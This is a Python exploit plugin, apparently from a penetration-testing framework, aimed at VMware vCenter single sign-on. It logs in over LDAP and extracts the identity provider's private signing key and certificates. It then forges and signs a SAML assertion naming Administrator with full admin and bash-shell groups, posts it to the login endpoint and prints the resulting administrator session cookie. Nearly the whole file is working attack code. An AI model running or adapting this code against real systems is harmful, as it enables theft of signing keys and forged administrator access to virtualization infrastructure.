import argparse
import base64
import ssl
import zlib
from copy import copy
from urllib.parse import urlparse, parse_qs
import lxml.etree as etree
from signxml import XMLSigner

import requests
from OpenSSL import crypto

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterSAMLRequest(PluginVCenterBase):
    display = "异常SAML请求"
    alias = "saml_req"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", dest="address")
        parser.add_argument("-u", "--ldap-user", help="ldap user", dest="ldap_user")
        parser.add_argument("-p", "--ldap-pass", help="ldap pass", dest="ldap_pass")
        parser.add_argument("--proxy", help="proxy", dest="proxy")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)
        vcenter = args.address
        username = args.ldap_user
        password = args.ldap_pass
        proxies = args.proxy

        vc_hostname = get_hostname(vcenter)
        vc_req, vc_domain, relay_state = saml_request(vcenter, proxies)
        saml_resp = fill_template(vc_hostname, vcenter, vc_domain, vc_req)
        sign_key, cert = get_key_ldap(vcenter, username, password)
        signed_resp = sign_assertion(saml_resp, sign_key, cert)
        c = login(vcenter, signed_resp, relay_state, proxies)
        check_cookie(vcenter, c, proxies)
        print(f'host: {vcenter} and sso.message:*')
        return result


def get_hostname(vcenter):
    import socket
    try:
        print('[*] Obtaining hostname from vCenter SSL certificate')
        dst = (vcenter, 443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])

        # get certificate
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert_bin)
        hostname = x509.get_subject().CN
        print(f'[*] Found hostname {hostname} for {vcenter}')
        return hostname
    except:
        print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
        raise

def saml_request(vcenter, proxies):
    """Get SAML AuthnRequest from vCenter web UI"""
    try:
        print(f'[*] Initiating SAML request with {vcenter}')
        r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False, proxies=proxies)
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        o = urlparse(r.headers["location"])
        domain = o.path.split('/')[-1]
        sr = parse_qs(o.query)["SAMLRequest"][0]
        relay_state = parse_qs(o.query).get("RelayState")
        if relay_state is not None:
            relay_state = relay_state[0]
        dec = base64.decodebytes(sr.encode("utf-8"))
        req = zlib.decompress(dec, -8)

        return etree.fromstring(req), domain, relay_state
    except:
        print(f'[-] Failed initiating SAML request with {vcenter}')
        raise

def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
    # generate ts
    from datetime import datetime, timedelta
    before = (datetime.today() - timedelta(days=30)).isoformat()[:-3] + 'Z'
    after = (datetime.today() + timedelta(days=30)).isoformat()[:-3] + 'Z'
    response_template = \
        r"""<?xml version="1.0" encoding="UTF-8"?>
        <saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
          <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
          <saml2p:Status>
            <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
            <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
          </saml2p:Status>
          <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
            <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
            <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
            <saml2:Subject>
              <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
              <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
              </saml2:SubjectConfirmation>
            </saml2:Subject>
            <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
              <saml2:ProxyRestriction Count="10"/>
              <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
              <saml2:AudienceRestriction>
                <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
              </saml2:AudienceRestriction>
            </saml2:Conditions>
            <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
              <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
              </saml2:AuthnContext>
            </saml2:AuthnStatement>
            <saml2:AttributeStatement>
              <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
              </saml2:Attribute>
              <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
              </saml2:Attribute>
              <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
              </saml2:Attribute>
              <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
              </saml2:Attribute>
              <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
              </saml2:Attribute>
            </saml2:AttributeStatement>
          </saml2:Assertion>
        </saml2p:Response>
        """

    try:

        response = response_template.replace("$VCENTER_IP", vcenter_ip). \
            replace("$VCENTER", vcenter_hostname). \
            replace("$DOMAIN", vcenter_domain). \
            replace("$ID", req.get("ID")). \
            replace("$ISSUEINSTANT", req.get("IssueInstant")). \
            replace("$NOT_BEFORE", before). \
            replace("$NOT_AFTER", after)
        return etree.fromstring(response.encode("utf-8"))
    except Exception as e:
        print(f'[-] Failed generating the SAML assertion: {e}')
        raise

def get_key_ldap(vcenter, ldap_user, ldap_pass):
    try:
        from ldap3 import Connection
        user = ldap_user
        passwd = ldap_pass
        conn = Connection(vcenter, user, passwd, auto_bind=True)
        conn.search(
            search_base='dc=vsphere,dc=local',
            search_filter='(objectclass=vmwSTSTenantCredential)',
            attributes=['vmwSTSPrivateKey', 'userCertificate']
        )
        sts_private_key = dict(conn.response[0]['attributes'])['vmwSTSPrivateKey']
        certs_byte = dict(conn.response[0]['attributes'])['userCertificate']
        key = "-----BEGIN PRIVATE KEY-----\n" + base64.encodebytes(sts_private_key).decode(
            "utf-8").rstrip() + "\n-----END PRIVATE KEY----- "
        certs = ["-----BEGIN CERTIFICATE-----\n" + base64.encodebytes(data).decode(
            "utf-8").rstrip() + "\n-----END CERTIFICATE-----" for data in certs_byte]

        return key, certs
    except Exception as e:
        print(f'{e}')
        raise

def sign_assertion(root, key, cert):
    """Sign the SAML assertion in the response using the IdP key"""
    try:
        print('[*] Signing the SAML assertion')
        assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
        signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=cert)
        return signed_assertion
    except:
        print('[-] Failed signing the SAML assertion')
        raise

def check_cookie(t, c, proxy):
    r = requests.get(f'https://{t}/ui/usersession', headers={'Cookie': c}, verify=False,
                     proxies=proxy)
    print(r)
    print(r.text)

def login(vcenter, saml_resp, rs, proxies):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    try:
        print('[*] Attempting to log into vCenter with the signed SAML request')
        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)

        r = requests.post(
            f"https://{vcenter}/ui/saml/websso/sso",
            allow_redirects=False,
            verify=False,
            data={"SAMLResponse": base64.encodebytes(resp),
                  'RelayState': rs},
            proxies=proxies
            # proxies={'https': 'http://127.0.0.1:8080'}
        )
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        cookie = r.headers["Set-Cookie"].split(";")[0]
        print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
        print(f'[+] Cookie: {cookie}')
        return cookie
    except:
        print('[-] Failed logging in with SAML request')
        raise
